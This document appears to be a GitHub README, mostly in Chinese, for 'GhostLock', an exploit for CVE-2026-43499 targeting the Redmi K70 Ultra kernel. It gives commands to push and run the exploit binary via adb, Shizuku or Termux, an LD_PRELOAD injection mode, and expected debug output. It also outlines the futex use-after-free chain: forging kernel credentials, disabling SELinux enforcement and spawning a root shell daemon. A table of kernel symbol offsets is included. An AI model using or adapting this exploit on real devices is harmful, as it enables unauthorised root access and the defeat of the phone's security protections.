# GhostLock (CVE-2026-43499) — Redmi K70 Ultra (rothko)

Data-only physmap overwrite exploit for MediaTek Dimensity 9300+ (MT6989).
Kernel: `6.1.138-android14-11` / HyperOS OS3.0.302.0.WNNCNXM.

## ⚠️ 前置条件

- **设备**: Redmi K70 Ultra (codename: rothko), Android 14 / HyperOS OS3.0.302.0.WNNCNXM
- **无需解 BL** — 通过 Shizuku（无线调试）即可获得 shell 权限来运行
- **Shizuku** 或 **adb shell** 可执行 arm64 二进制
- 运行后**设备会重启**（内核 panic — 预期行为）。如需保存日志，提前连好 adb logcat

## 📦 下载

从 [GitHub Releases](https://github.com/SlightNeko/ghostlock-rothko/releases) 下载最新的 `ghostlock_rothko_strip`。

## 🚀 测试方法

### 方法 1：通过 ADB

```bash
# 推送二进制到设备
adb push ghostlock_rothko_strip /data/local/tmp/

# 赋予执行权限
adb shell chmod 755 /data/local/tmp/ghostlock_rothko_strip

# 运行（可能立即重启）
adb shell /data/local/tmp/ghostlock_rothko_strip
```

### 方法 2：通过 Shizuku

前提：Shizuku 已启动（无线调试授权），有任一终端 App（如 Termux）已授权 Shizuku。

```bash
# 用 adb 把 binary 推到设备
adb push ghostlock_rothko_strip /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_rothko_strip

# 在 Termux 里（已授权 Shizuku）直接执行：
adb shell /data/local/tmp/ghostlock_rothko_strip
```

如果不想连电脑，先把文件传到手机，然后在 Termux 里：

```bash
cp /sdcard/Download/ghostlock_rothko_strip /data/local/tmp/
chmod 755 /data/local/tmp/ghostlock_rothko_strip
/data/local/tmp/ghostlock_rothko_strip
```

### 方法 3：LD_PRELOAD 注入模式

```bash
adb push preload.so /data/local/tmp/
adb shell
cd /data/local/tmp
LD_PRELOAD=./preload.so /system/bin/sh -c exit
```

## 📋 预期行为

| 阶段 | 输出 | 说明 |
|------|------|------|
| 初始化 | `[*] GhostLock - rothko (MT6989 D9300+) 6.1.138` | 设备识别正确 |
| CPU 绑定 | `[+] CPU0 pinned` | 固定到 CPU0 |
| 地址加载 | `[*] init_task @ 0xffffff800206f600` | 固定 LM 地址 |
| 权限检查 | `[+] uid: xxxxx` | 打印当前 uid |
| KASLR slide | `[+] slide = 0` 或 `slide = xxx` | KASLR 检测 |
| 触发提权 | 成功后 uid 变 0 | 拿到 root |
| LD_PRELOAD | spawn su daemon | shell 注入成功 |
| 失败 | `[-] ...` + 重启 | 内核 panic（漏洞存在） |

**注意**：`/proc/self/pagemap` 在 Android 6.1 内核下已被 SELinux 封锁，exploit 会回退到匿名页暴力扫描。如果连续打印 `No PFN found`，可以手动指定物理页帧号：

```bash
export EXPLOIT_PFN=0x<物理页帧号>
./ghostlock_rothko_strip
```

## 🔧 漏洞机制（简述）

CVE-2026-43499 是一个 **data-only physmap overwrite** 漏洞，利用内核 futex `CMP_REQUEUE_PI` 操作的 **use-after-free**：

1. **漏洞触发**：通过 3 个线程构造 futex PI 死锁环，触发 `rt_mutex_waiter` 的 UAF
2. **物理地址探测**：`/proc/self/pagemap` 读取（root）/ 匿名页暴力扫描（无 root）
3. **提权**：在 physmap 中找到受害页后，伪造 `task_struct` + `cred`，将当前进程的 uid/gid 改 0
4. **selinux 绕过**：置零 `selinux_state.enforcing`
5. **su daemon**：提权后在 socket 上 spawn 一个 root shell

KernelSnitch（futex 时序侧信道）提供了无 pagemap 的 fallback。

## 📊 调试输出格式

```text
[*] GhostLock - rothko (MT6989 D9300+) 6.1.138
[+] CPU0 pinned
[*] Using fixed LM addresses
[*] init_task   @ 0xffffff800206f600
[*] init_cred   @ 0xffffff8002081a68
[+] slide = 0
[+] physmap: leaking task @ phys 0x...
[*] fake task at phys 0x...
[+] Credentials overwritten!
[+] uid: 0 (root!)
```

如果设备重启且 **没有** `Credentials overwritten` 输出 → 内核触发 panic，漏洞存在但需要调整偏移。

## 🔄 重新编译

如果你有 NDK r27+，可以自行编译：

```bash
export NDK_ROOT=/path/to/android-ndk-r27
make preload TARGET_HEADER=target.h
```

输出在 `build/bin/ghostlock_rothko` 和 `build/bin/preload.so`。

## 🧬 偏移表

所有偏移从 `vmlinux.elf` 的 BTF + `init_task` 原始字节双重验证提取：

| 符号 | 虚拟地址 |
|------|---------|
| init_task | 0xffffffc009fef600 |
| init_cred | 0xffffffc00a001a68 |
| entry_task | 0xffffffc009fac318 |
| per_cpu_offset | 0xffffffc009fdb650 |
| root_task_group | 0xffffffc00a1d7580 |
| selinux_enforcing | 0xffffffc00a2293d0 |

完整定义见 [`target.h`](target.h)。

## 📜 License

For research/educational purposes only. Use at your own risk.

**Original PoC**: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) → `IonStack/CVE-2026-43499/exploit/`
